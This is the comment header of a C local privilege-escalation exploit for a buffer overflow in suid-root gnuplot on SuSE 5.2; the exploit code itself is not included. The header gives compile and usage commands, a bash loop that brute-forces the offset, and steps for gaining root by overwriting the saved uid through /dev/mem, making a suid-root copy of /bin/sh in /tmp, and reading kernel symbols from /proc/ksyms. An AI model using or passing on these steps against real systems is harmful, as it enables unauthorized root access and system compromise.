/*
gnuplot Linux x86 exploit from xnec
tested on gnuplot Linux version 3.5 (pre 3.6) patchlevel beta 336/SuSE 5.2
gnuplot ships suidroot by default in SuSE 5.2, maybe others
 
gcc -o xnec_plot xnec_plot.c
./xnec_plot <bufsiz> <offset>
 
The buffer we're overflowing is only 80 bytes, so we're going to have to
get our settings just so.  If you don't feel like typing in command line
offsets and bufsizes, make a little shell script:
---
#! /bin/bash
bufsiz=110
offset=0
 
while [ $offset -lt 500 ]; do
 ./xnec_plot $bufsiz $offset
 offset=`expr $offset + 10`
done
---
 since gnuplot drops root privs after it inits your svga, we can't just exec
 /bin/sh, we'll need to use the technique of replacing our saved uid
 in /dev/mem with '0', then execing whatever we please.  We do this by compiling
 Nergal's program, mem.c and putting the output file in /tmp/xp, as in
 gcc -o /tmp/xp mem.c.  Nergal's program will then make /tmp/sh suidroot,
 so don't forget to cp /bin/sh /tmp/sh.  You will also have to change
 line 32 to the correct address of kstat, which can be obtained by doing
 strings /proc/ksyms | grep kstat.
 
 greets to #sk1llz, xnec on EFnet and DALnet
